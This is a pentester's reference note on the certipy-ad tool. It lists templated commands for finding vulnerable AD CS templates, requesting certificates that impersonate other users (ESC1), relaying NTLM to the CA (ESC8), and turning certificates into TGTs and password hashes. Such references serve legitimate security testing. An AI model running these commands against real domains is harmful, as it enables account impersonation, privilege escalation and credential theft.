# certipy-ad

**Install:** `pipx install certipy-ad`  
**GitHub:** https://github.com/ly4k/Certipy  
**Tags:** #tool #AD #adcs #certificate #privesc

---

## Overview
Tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations. Covers the full ESC attack class (ESC1–ESC13). The gold standard for AD CS pentesting.

## Common Usage

### Enumerate vulnerable templates and CAs
```bash
certipy find -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -vulnerable
certipy find -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -vulnerable -stdout
```

### Request certificate (ESC1 — arbitrary SAN)
```bash
certipy req \
  -u '[user]$' -p '[password]' \
  -dc-ip [dc-ip] -target [ca-host] \
  -ca [ca-name] -template [template] \
  -upn [target@domain] -sid [target-SID]
```

### Relay NTLM auth to AD CS (ESC8)
```bash
certipy relay -target 'http://[ca-host]' -template 'DomainController'
```

### Authenticate with certificate → get TGT + hash
```bash
certipy auth -pfx [cert.pfx] -dc-ip [dc-ip]
```

## Key Output Fields (certipy find)

| Field | What it means |
|-------|--------------|
| `CA Name` | Use as `-ca` value in certipy req |
| `DNS Name` | Use as `-target` value in certipy req/relay |
| `ESC1` | Template allows arbitrary SAN — enrollee can impersonate any user |
| `ESC8` | HTTP enrollment endpoint lacks EPA — vulnerable to NTLM relay |
| `Enrollment Rights` | Who can enroll — determines if machine account needed |

## Notes
- `-dc-ip` = Domain Controller (Kerberos/LDAP) — **not** the CA
- `-target` = CA server DNS name — **not** the DC
- `certipy find -vulnerable` filters output to only exploitable conditions
- Output saved as `.pfx` (certificate + private key)

## Related
- [[ttps/credential-access/adcs-esc1-san-impersonation]]
- [[ttps/credential-access/adcs-cert-auth]]
- [[playbooks/adcs-esc1-domain-admin]]
- [[tools/addcomputer]]
